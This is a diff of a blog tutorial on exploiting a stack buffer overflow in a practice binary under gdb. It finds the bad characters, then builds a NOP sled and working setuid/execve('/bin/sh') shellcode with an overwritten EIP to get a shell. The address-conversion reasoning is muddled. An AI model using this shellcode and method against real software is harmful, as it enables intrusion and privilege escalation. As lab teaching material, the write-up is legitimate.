@@ -778,7 +778,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 <p><strong>2.</strong> Finding the offset - trying to find the max size for the crash point, meaning how much more data we can insert to the crash point in such way that the execution not change the stack and EIP location.</p>
 
-<p><strong>3.</strong> Overwrite the RIP - running <code class="highlighter-rouge">msf-pattern_create -l &lt;number&gt;</code> and find on the crash point, where the <code class="highlighter-rouge">EIP</code> location, we can use the <code class="highlighter-rouge">msf-pattern_offset -q &lt;eip value&gt;</code> command.</p>
+<p><strong>3.</strong> Overwrite the EIP - running <code class="highlighter-rouge">msf-pattern_create -l &lt;number&gt;</code> and find on the crash point, where the <code class="highlighter-rouge">EIP</code> location, we can use the <code class="highlighter-rouge">msf-pattern_offset -q &lt;eip value&gt;</code> command.</p>
 
 <p><strong>4.</strong> Finding the bad chars - after finding the size that can be use for the crash, find what chars are the bed chars, we can use the following command <code class="highlighter-rouge">badchars -f python</code>, then after crash, if the location of the <code class="highlighter-rouge">EIP</code> was change it’s mean that there is some char that have special command, so we need to go the register and find the badchars location and remove the chars needed.</p>
 
@@ -830,6 +830,53 @@ int main (int argc, char** argv)
 
 <p><img src="/assets/images/bo-018.png" alt="bo-018.png" />
 <strong>Figure 18</strong> Overwrite the EIP with <code class="highlighter-rouge">B</code>.</p>
+
+<p>So now it’s time to check the bad chars if we have such on our case, we can run the command <code class="highlighter-rouge">badchars</code> on our kali, or just run the following:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>badchars -f js | sed 's/ //g' | sed 's/"//g' | sed 's/+//g' | tr -d "\n"
+</code></pre></div></div>
+
+<p>The output should be the following:</p>
+
+<p><img src="/assets/images/bo-019.png" alt="bo-019.png" />
+<strong>Figure 19</strong> Badchars string.</p>
+
+<p>We can use that output on our debugging, but now it’s time to make break point to main and then run that badchars check, so run <code class="highlighter-rouge">break main</code> will give us the first break point on our gdb.</p>
+
+<p><img src="/assets/images/bo-020.png" alt="bo-020.png" />
+<strong>Figure 20</strong> Make break point to main and check badchars.</p>
+
+<p>So now we need to look on our stack and search for the location of bad chars, since I have users multiple <code class="highlighter-rouge">A</code> we need to find <code class="highlighter-rouge">\x41</code> first and then I should look for the order of the chars for bad chars.</p>
+
+<p>On our case the bad chars are <code class="highlighter-rouge">\x01</code>, <code class="highlighter-rouge">\x09</code>, <code class="highlighter-rouge">\x20</code>, the 01 char was not dispay on the screen and the others was change to <code class="highlighter-rouge">\x00</code> which is not in place, that mean that these chars are used for another direction on the binary file, so we need to avoid using them on our executable code.</p>
+
+<p><img src="/assets/images/bo-021.png" alt="bo-021.png" />
+<strong>Figure 21</strong> Checking the badchars location.</p>
+
+<p>The chars on our shell code not contain these bad chars so we still use it:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80
+</code></pre></div></div>
+
+<p>So now we need to make SLAD to our shell code, since we know that the segmentation fault occur on 500 chars long we can calculated what we need:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run $(python2 -c "print '\x90'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\x62\x62\x62\x62'")
+</code></pre></div></div>
+
+<p>Please note, the <code class="highlighter-rouge">\x62</code> is <code class="highlighter-rouge">b</code>, since I want to see EIP overwrite with BBBB and since we have convertToUppercase function, I must to use lowercase <code class="highlighter-rouge">b</code> for that case.</p>
+
+<p><img src="/assets/images/bo-022.png" alt="bo-022.png" />
+<strong>Figure 22</strong> Running the code with overwrite the EIP.</p>
+
+<p>Now, think about it, if we must write <code class="highlighter-rouge">\x62</code> for get <code class="highlighter-rouge">\x42</code> as the output for overwrite the EIP, it’s mean that we must insert EIP address that contain value of uppercase for the address that point to our SLAD, so let’s check the ESP what is that address.</p>
+
+<p><img src="/assets/images/bo-023.png" alt="bo-023.png" />
+<strong>Figure 23</strong> Searching for the correct address.</p>
+
+<p>After we found the address that point out to out NULL chain bytes, we need to convert that to “uppercase” so we can use it on the EIP, so in my case the address is <code class="highlighter-rouge">0xffffcfe0</code> which mean that the EIP should be overwrite with <code class="highlighter-rouge">\xe0\xcf\xff\xff</code>, so by convert to we should get <code class="highlighter-rouge">\x00\xef\x1f\x1f</code>, but since we can’t use <code class="highlighter-rouge">\x00</code> we need to use some other char, so give it more for byte lead as to the following <code class="highlighter-rouge">\x04\xef\x1f\x1f</code> which should be change by the uppercase function to <code class="highlighter-rouge">0xffffcfe4</code>.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run $(python2 -c "print '\x90'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\x04\xef\x1f\x1f'")
+</code></pre></div></div>
+<p>Then BOIA!!!! we have a shell!</p>
+
+<p><img src="/assets/images/bo-024.png" alt="bo-024.png" />
+<strong>Figure 24</strong> Shell from GDB.</p>
 
     
 
